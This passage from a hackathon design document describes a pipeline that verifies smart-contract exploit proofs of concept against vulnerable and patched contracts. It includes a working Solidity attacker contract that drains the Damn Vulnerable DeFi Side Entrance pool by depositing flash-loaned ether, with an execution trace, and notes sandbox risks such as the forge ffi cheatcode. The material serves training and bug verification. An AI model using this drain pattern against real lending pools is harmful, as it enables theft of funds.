          const brokenInvariants = postPoC.filter((r) => !r.holds)
          const vulnBroken = brokenInvariants.length > 0

          if (!vulnBroken) {
            // PoC did not break any invariants — invalid
            return {
              verdict: "INVALID" as Verdict,
              severity: null,
              challengeId,
              prePoC,
              postPoC,
              postPoCPatched: null,
              pocExecution: pocResult,
              pocExecutionPatched: null,
              durationMs: Date.now() - startTime,
              summary: "PoC did not break any invariants on the vulnerable contract.",
            } satisfies VerificationResult
          }

          // --- Phase 2: Patched contract ---
          yield* Effect.log(`[Pipeline] Reverting devnet, deploying ${challengeId} (patched)`)
          yield* devnet.revert(snapshotId)

          const patchedContract = yield* contracts.deploy({
            challengeId,
            version: "patched",
            value: params?.deployValue,
            constructorArgs: params?.constructorArgs
              ? JSON.parse(params.constructorArgs)
              : undefined,
          })

          // Run same PoC against patched
          yield* Effect.log("[Pipeline] Running PoC against patched contract")
          const pocResultPatched = yield* runner.runFoundryTest({
            testSource: pocSource,
            testFunction: pocFunction,
            verbosity: 3,
            timeoutSeconds: 60,
          })

          // Post-PoC invariant check on patched
          yield* Effect.log("[Pipeline] Checking post-PoC invariants on patched")
          const postPoCPatched = yield* checker.checkAll({
            challengeId,
            contractAddress: patchedContract.address,
            params: { ...params, contractAddress: patchedContract.address },
          })

          const patchedBroken = postPoCPatched.some((r) => !r.holds)

          // --- Verdict ---
          const highestSeverity = brokenInvariants.reduce<Severity>(
            (acc, inv) => {
              const order: Severity[] = ["critical", "high", "medium", "low", "informational"]
              return order.indexOf(inv.severity) < order.indexOf(acc)
                ? inv.severity
                : acc
            },
            "informational"
          )

          if (!patchedBroken) {
            // Vuln broken, patched holds -> VALID BUG
            return {
              verdict: "VALID_BUG" as Verdict,
              severity: highestSeverity,
              challengeId,
              prePoC,
              postPoC,
              postPoCPatched,
              pocExecution: pocResult,
              pocExecutionPatched: pocResultPatched,
              durationMs: Date.now() - startTime,
              summary: `Valid vulnerability confirmed. Severity: ${highestSeverity}. ` +
                `Broken invariants: ${brokenInvariants.map((i) => i.invariantId).join(", ")}. ` +
                `Patched version withstands the same PoC.`,
            } satisfies VerificationResult
          } else {
            // Both broken -> TEST_ARTIFACT
            return {
              verdict: "TEST_ARTIFACT" as Verdict,
              severity: null,
              challengeId,
              prePoC,
              postPoC,
              postPoCPatched,
              pocExecution: pocResult,
              pocExecutionPatched: pocResultPatched,
              durationMs: Date.now() - startTime,
              summary: "PoC breaks invariants on both vulnerable and patched versions. " +
                "This suggests the PoC exploits something other than the known vulnerability, " +
                "or the patch is insufficient.",
            } satisfies VerificationResult
          }
        }),
    } satisfies VerificationPipelineService
  })
)
```

---

## 6. Example Flow: Side Entrance End-to-End

### 6.1 PoC source (submitted by prover)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/side-entrance/SideEntranceLenderPool.sol";

contract Attacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}

contract PoCTest is Test {
    uint256 constant ETHER_IN_POOL = 1000 ether;
    SideEntranceLenderPool pool;

    function setUp() public {
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
    }

    function testPoC() public {
        uint256 poolBalanceBefore = address(pool).balance;
        assertEq(poolBalanceBefore, ETHER_IN_POOL);

        Attacker attacker = new Attacker(address(pool));
        attacker.attack();

        // Pool is drained
        assertEq(address(pool).balance, 0);
    }
}
```

### 6.2 Pipeline execution trace

```
[Pipeline] Deploying side-entrance (vulnerable)
  → forge create --rpc-url http://anvil:8545 --private-key 0xac09... --json src/side-entrance/SideEntranceLenderPool.sol:SideEntranceLenderPool
  → Deployed at 0x5FbDB2315678afecb367f032d93F642f64180aa3

[Pipeline] Taking snapshot
  → cast rpc --rpc-url http://anvil:8545 evm_snapshot
  → Snapshot: 0x1

[Pipeline] Checking pre-PoC invariants
  → cast balance --rpc-url http://anvil:8545 0x5FbD...
  → 1000000000000000000000 wei (1000 ETH)
  → Invariant pool-balance-gte-deposits: HOLDS ✓

[Pipeline] Running PoC against vulnerable contract
  → Writing PoC to contracts/test/PoC.t.sol
  → forge test --root ./contracts --rpc-url http://anvil:8545 -vvv --match-path test/PoC.t.sol
  → [PASS] testPoC() (gas: 145832)
  → PoC passed (exit code 0)

[Pipeline] Checking post-PoC invariants
  → cast balance --rpc-url http://anvil:8545 0x5FbD...
  → 0 wei
  → Invariant pool-balance-gte-deposits: BROKEN ✗

[Pipeline] Reverting devnet to snapshot 0x1
  → cast rpc --rpc-url http://anvil:8545 evm_revert 0x1

[Pipeline] Deploying side-entrance (patched)
  → forge create ... SideEntranceLenderPoolFixed
  → Deployed at 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512

[Pipeline] Running PoC against patched contract
  → forge test --root ./contracts --rpc-url http://anvil:8545 -vvv --match-path test/PoC.t.sol
  → [FAIL] testPoC() — "No deposits during flash loan"
  → PoC failed (exit code 1) — patched contract rejected the attack

[Pipeline] Checking post-PoC invariants on patched
  → cast balance --rpc-url http://anvil:8545 0xe7f1...
  → 1000000000000000000000 wei
  → Invariant pool-balance-gte-deposits: HOLDS ✓

[Pipeline] VERDICT: VALID_BUG
  Severity: critical
  Broken invariants: pool-balance-gte-deposits
  Patched version withstands the same PoC.
```

### 6.3 Composing the layers

```typescript
// packages/verifier/src/index.ts
import { Effect, Layer } from "effect"
import { NodeFileSystem } from "@effect/platform-node"
import { AnvilLayer } from "./Devnet.js"
import { FoundryLayer as ContractsLayer } from "./ContractManager.js"
import { FoundryLayer as RunnerLayer } from "./TransactionRunner.js"
import { RegistryLayer } from "./InvariantChecker.js"
import { PipelineLayer, VerificationPipeline } from "./VerificationPipeline.js"

// Full composed layer: all 5 layers wired together
const VerifierLive = PipelineLayer.pipe(
  Layer.provide(RegistryLayer),
  Layer.provide(RunnerLayer),
  Layer.provide(ContractsLayer),
  Layer.provide(AnvilLayer),
  Layer.provide(NodeFileSystem.layer),
)

// Example: verify a PoC
const program = Effect.gen(function* () {
  const pipeline = yield* VerificationPipeline

  const result = yield* pipeline.verify({
    challengeId: "side-entrance",
    pocSource: "...", // Solidity source from prover
    pocFunction: "testPoC",
    params: {
      initialDeposit: "1000000000000000000000", // 1000 ETH in wei
      deployValue: "1000ether",
    },
  })

  yield* Effect.log(`Verdict: ${result.verdict}`)
  yield* Effect.log(`Severity: ${result.severity}`)
  yield* Effect.log(`Summary: ${result.summary}`)
  yield* Effect.log(`Duration: ${result.durationMs}ms`)

  return result
})

// Run
program.pipe(Effect.provide(VerifierLive), Effect.runPromise)
```

---

## 7. Open Questions and Risks

### 7.1 PoC ↔ Contract Address Binding

The PoC test file in Section 6.1 deploys its own contract in `setUp()`. This is the simplest approach but means the PoC controls the deployment, not our pipeline. Two options:

- **Option A (simpler, recommended for hackathon):** Let the PoC deploy its own contracts. Our invariant checker reads state from the address the PoC deployed to. The PoC must emit an event or use a known address pattern so we can find it.
- **Option B (stricter):** The pipeline deploys the contract and passes the address to the PoC via environment variable or constructor arg. Requires PoC to accept an external contract address.

For the demo, Option A is faster. The PoC `setUp()` handles everything, and our invariant checker runs against the known contract pattern.

**Update needed:** If using Option A, the invariant checker needs the contract address from the PoC. We could parse forge test output for deployed addresses, or require the PoC to use `vm.label` / emit a specific event.

### 7.2 PoC Sandbox Security

A malicious PoC test file could attempt:
- **Infinite loops / gas bombs:** Mitigated by forge's `--gas-limit` and our timeout.
- **File system access:** Forge tests run in the EVM, so no host FS access. But the Solidity `ffi` cheatcode can execute arbitrary host commands. **We MUST disable ffi:** `forge test --no-ffi`.
- **Network access:** The Docker container's network is restricted to `mnemo-internal`. The PoC cannot reach the internet.
- **Resource exhaustion:** Docker resource limits (`--memory`, `--cpus`) on the verifier container.

Add to the `forge test` command: `--no-ffi` (critical).

### 7.3 Contract Address Determinism

Anvil uses deterministic addresses based on deployer nonce. After a `revert`, the nonce resets, so the patched contract deploys to the same address as the vulnerable one. This is actually desirable — the PoC targets the same address in both runs.

However, if the PoC itself deploys contracts (Option A above), those addresses may differ between runs. This is acceptable for the demo.

### 7.4 Foundry Image Size

`ghcr.io/foundry-rs/foundry:latest` is ~200MB. Inside the TEE, image size matters. Options:
- Use the full image (simplest, 200MB is acceptable for hackathon)
- Build a minimal image with just `forge`, `cast`, `anvil` binaries (~50MB)

For hackathon: use the full image.

### 7.5 Forge Test ↔ Devnet RPC

By default, `forge test` uses its own internal EVM, not an external RPC. To run tests against our anvil, we need `--fork-url` (not `--rpc-url`). The PoC would then execute against the forked anvil state.

**Correction to the service design:** Replace `--rpc-url` with `--fork-url` in TransactionRunner's `forge test` invocation.

Alternatively, let `forge test` use its internal EVM (faster, no anvil dependency for the test itself), and use anvil only for the invariant checks via `cast`. This means:
- PoC runs in forge's internal EVM (isolated, fast)
- Invariant checks run against anvil (separate state)

This is a fundamental design choice:

| Approach | Pros | Cons |
|---|---|---|
| PoC on forge internal EVM | Faster, isolated, simpler | PoC and invariant checks are on different state |
| PoC on anvil via `--fork-url` | Shared state with invariant checks | Slower, more complex setup |
| PoC deploys + checks in one forge test | Simplest, self-contained | Less separation of concerns |

**Recommended for hackathon:** Self-contained forge tests (the PoC file includes both setup, exploit, and assertions). The pipeline runs `forge test` and checks the exit code. Invariant checking via `cast` is a secondary validation. This matches how DVDeFi tests already work.

### 7.6 Patched Contract Import Paths

The PoC test file imports from the vulnerable contract path. When we re-run against the patched version, the PoC still imports the vulnerable contract. Options:
- **Symlink swap:** Before running the patched test, symlink the vulnerable file to point to the patched file. Fragile.
- **Separate test runs with foundry profiles:** Use `FOUNDRY_PROFILE` to switch source directories.
- **Contract replacement via anvil `setCode`:** Deploy vulnerable, run PoC, then use `anvil_setCode` to replace the bytecode at the same address with the patched version, and re-run.

**Recommended:** The `anvil_setCode` approach is cleanest. Deploy once, run PoC, revert, `setCode` to patched bytecode, run PoC again. No import path issues.

```typescript
// In VerificationPipeline, Phase 2 becomes:
yield* devnet.revert(snapshotId)
const patchedArtifact = yield* contracts.getArtifact({
  challengeId, version: "patched"
})
// Replace bytecode at the same address
yield* castRpc(devnet.rpcUrl, "anvil_setCode", [
  vulnContract.address,
  patchedArtifact.bytecode,
])
// Now re-run the same PoC — it targets the same address but patched code
```

### 7.7 Time Pressure

This is a hackathon. The full 5-layer service design is the target architecture. The **minimum viable pipeline** (Section 8) is what we should build first.

---

## 8. What to Build First (Minimal Viable Pipeline)

### MVP: Shell script, no Effect services

Before building the full Effect service stack, prove the concept works with a shell script:

```bash
#!/bin/bash
# mvp-verify.sh — Minimal verification pipeline for Side Entrance
set -euo pipefail

ANVIL_URL="http://localhost:8545"
CONTRACTS_DIR="./packages/verifier/contracts"
POC_FILE="$1"  # Path to PoC .t.sol file

echo "=== Phase 1: Build contracts ==="
cd "$CONTRACTS_DIR"
forge build

echo "=== Phase 2: Run PoC against vulnerable contract ==="
# forge test runs the PoC in its own EVM (self-contained)
if forge test --match-path "test/PoC.t.sol" -vvv --no-ffi 2>&1; then
  echo "=== PoC PASSED (exploit succeeded) ==="
  VULN_RESULT="broken"
else
  echo "=== PoC FAILED (exploit did not work) ==="
  VULN_RESULT="holds"
fi

echo "=== Phase 3: Swap to patched contract, re-run ==="
# Swap the import (or use a separate test file for patched)
if forge test --match-path "test/PoCPatched.t.sol" -vvv --no-ffi 2>&1; then
  echo "=== PoC PASSED against patched (patch insufficient) ==="
  PATCHED_RESULT="broken"
else
  echo "=== PoC FAILED against patched (patch works) ==="
  PATCHED_RESULT="holds"
fi

echo "=== Verdict ==="
if [[ "$VULN_RESULT" == "broken" && "$PATCHED_RESULT" == "holds" ]]; then
  echo "VALID_BUG — Severity: Critical"
elif [[ "$VULN_RESULT" == "holds" ]]; then
  echo "INVALID — PoC does not demonstrate a vulnerability"
elif [[ "$VULN_RESULT" == "broken" && "$PATCHED_RESULT" == "broken" ]]; then
  echo "TEST_ARTIFACT — PoC breaks both versions"
fi
```

### Build order

1. **Day 1:** Create `packages/verifier/contracts/` Foundry project. Copy Side Entrance from DVDeFi v4. Write patched version. Write PoC test. Verify `forge test` works locally.

2. **Day 1:** Write `mvp-verify.sh`. Confirm the full sequence works: PoC passes on vulnerable, fails on patched.

3. **Day 2:** Add anvil service to Docker Compose. Write `Dockerfile.verifier`. Verify the shell pipeline works inside Docker.

4. **Day 2-3:** Implement Effect services (Devnet, ContractManager, TransactionRunner, InvariantChecker). Start with Devnet + TransactionRunner since those are the core.

5. **Day 3:** Implement VerificationPipeline. Wire into the harness as a tool the verifier agent can call.

6. **Day 3-4:** Add Truster as a second challenge to prove reusability.

### Dependencies

```json
{
  "name": "@mnemo/verifier",
  "dependencies": {
    "effect": "^3.19.14",
    "@effect/platform": "^0.94.1",
    "@effect/platform-node": "^0.104.0"
  }
}
```

No Voltaire dependency. No additional npm packages beyond what the harness already uses. The only external tools are Foundry binaries (`forge`, `cast`, `anvil`), which come from the Docker image.
